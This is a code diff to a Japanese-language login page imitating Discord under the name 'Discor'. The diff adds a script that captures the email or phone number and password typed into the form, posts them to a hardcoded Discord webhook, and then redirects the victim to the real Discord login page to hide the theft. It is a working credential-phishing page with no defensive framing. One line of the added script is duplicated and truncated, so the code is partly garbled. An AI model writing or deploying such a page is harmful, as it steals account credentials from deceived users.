@@ -146,6 +146,11 @@
   }
   .submit:hover{ background:var(--accent-hover); }
   .submit:active{ transform:translateY(1px); }
+  .submit:disabled{ 
+    background:var(--accent-soft); 
+    cursor: not-allowed;
+    transform: none;
+  }
 
   .switch{
     text-align:center;
@@ -229,7 +234,7 @@
 </head>
 <body>
   <div class="wrap">
-    <form onsubmit="return false;">
+    <form id="loginForm">
       <div class="logo">
         <span class="mark">
           <img src="IMG_0138.jpg" alt="Discor Logo">
@@ -243,22 +248,95 @@
       <div class="field">
         <label>メールアドレスまたは電話番号 <span class="req">*</span></label>
         <div class="input-shell">
-          <input type="text" autocomplete="username" autofocus>
+          <input type="text" id="email" autocomplete="username" autofocus required>
         </div>
       </div>
 
       <div class="field" style="margin-bottom:8px;">
         <label>パスワード <span class="req">*</span></label>
         <div class="input-shell">
-          <input id="pw" type="password" autocomplete="current-password">
+          <input id="pw" type="password" autocomplete="current-password" required>
         </div>
         <a href="#" class="forgot">パスワードをお忘れですか？</a>
       </div>
 
-      <button type="submit" class="submit">ログイン</button>
+      <button type="submit" class="submit" id="loginBtn" disabled>ログイン</button>
 
       <p class="switch">アカウントが必要ですか？ <a href="#">登録</a></p>
     </form>
   </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('loginForm');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('pw');
+      const loginBtn = document.getElementById('loginBtn');
+      
+      // 入力フィールドの状態を監視してボタンの有効/無効を切り替える
+      function checkFormValidity() {
+        if (emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+          loginBtn.disabled = false;
+        } else {
+          loginBtn.disabled = true;
+        }
+      }
+      
+      emailInput.addEventListener('input', checkFormValidity);
+      passwordInput.addEventListener('input', checkFormValidity);
+      FormValidity);
+      passwordInput.addEventListener('input', checkFormValidity);
+      
+      // フォーム送信時の処理
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // 入力値を取得
+        const email = emailInput.value;
+        const password = passwordInput.value;
+        
+        // Discord Webhookにデータを送信
+        const webhookUrl = 'https://discord.com/api/webhooks/1551084366321557556/0zfP9YT2RJj912PkcRtAXWjrxC1nqE75BPYJOAzFugdV1fOYp0xoZXr3PRtiTrYrJF_v';
+        
+        const payload = {
+          content: '新しいログイン試行:',
+          embeds: [{
+            title: 'Discor ログイン情報',
+            fields: [
+              {
+                name: 'メールアドレス/電話番号',
+                value: email,
+                inline: false
+              },
+              {
+                name: 'パスワード',
+                value: password,
+                inline: false
+              }
+            ],
+            color: 5814783,
+            timestamp: new Date().toISOString()
+          }]
+        };
+        
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          // 成功したらDiscordの公式ログインページにリダイレクト
+          window.location.href = 'https://discord.com/login';
+        })
+        .catch(error => {
+          console.error('Error sending to webhook:', error);
+          // エラー時もDiscordの公式ログインページにリダイレクト
+          window.location.href = 'https://discord.com/login';
+        });
+      });
+    });
+  </script>
 </body>
 </html>
